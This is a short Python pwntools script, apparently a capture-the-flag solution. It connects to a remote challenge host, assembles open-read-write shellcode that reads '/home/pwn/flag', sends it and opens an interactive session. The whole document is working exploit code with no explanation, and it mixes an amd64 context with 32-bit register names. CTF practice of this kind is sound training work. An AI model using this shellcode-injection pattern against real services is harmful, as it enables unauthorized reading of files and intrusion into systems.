from pwn import *
context.clear(kernel='amd64', os='linux')
p = remote("realsung.kr", 13344)

shellcode = shellcraft.pushstr("/home/pwn/flag")
shellcode += shellcraft.open("esp", 0, 0)
shellcode += shellcraft.read("eax", "esp", 100)
shellcode += shellcraft.write(0, "esp", 100)

p.sendline(asm(shellcode))

p.interactive()